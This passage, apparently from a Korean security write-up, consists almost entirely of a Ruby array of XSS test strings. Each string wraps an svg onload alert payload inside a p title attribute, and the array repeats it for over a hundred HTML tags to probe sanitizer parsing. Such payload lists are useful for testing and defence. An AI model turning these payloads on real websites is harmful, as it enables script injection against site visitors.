+<span class="hljs-operator">&lt;</span>xmp<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+</code></pre>
+<p>ruby code로 작성해서 돌려줍니다. 그러면…</p>
+<pre><code class="language-ruby hljs">arr <span class="hljs-operator">=</span> <span class="hljs-operator">[</span><span class="hljs-string">&#39;&lt;a&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;abbr&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;acronym&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;address&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;applet&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;area&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;article&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;aside&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;audio&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;b&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;base&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;basefont&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;bdi&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;bdo&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;bgsound&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;big&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;blink&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;blockquote&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;body&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;br&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;button&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;canvas&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;caption&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;center&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;cite&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;code&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;col&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;colgroup&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;content&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;data&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;datalist&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dd&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;del&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;details&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dfn&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dialog&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dir&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;div&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dl&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;dt&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;em&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;embed&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;fieldset&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;figcaption&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;figure&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;font&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;footer&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;form&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;frame&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;frameset&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h1&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h2&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h3&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h4&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h5&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;h6&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;head&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;header&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;hgroup&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;hr&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;html&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;i&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;iframe&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;img&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;input&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;ins&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;isindex&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;kbd&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;keygen&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;label&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;legend&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;li&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;link&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;listing&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;main&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;map&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;mark&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;marquee&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;menu&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;menuitem&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;meta&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;meter&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;nav&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;nobr&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;noframes&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;noscript&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;object&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;ol&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;optgroup&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;option&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;output&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;p&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;param&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;picture&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;plaintext&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;pre&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;progress&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;q&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;rp&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;rt&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;rtc&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;ruby&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;s&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;samp&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;script&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;section&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;select&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;shadow&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;slot&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;small&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;source&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;spacer&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;span&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;strike&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;strong&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;style&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;sub&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;summary&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;sup&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;table&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;tbody&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;td&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;template&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;textarea&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;tfoot&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;th&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;thead&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;time&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;title&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;tr&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;track&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;tt&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;u&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;ul&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;var&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;video&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;wbr&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-string">&#39;&lt;xmp&gt;&lt;p title=&quot;&lt;/#{endtag}&gt;&lt;svg/onload=alert(#{starttag})&gt;&quot;&gt;&#39;</span><span class="hljs-operator">]</span>
+
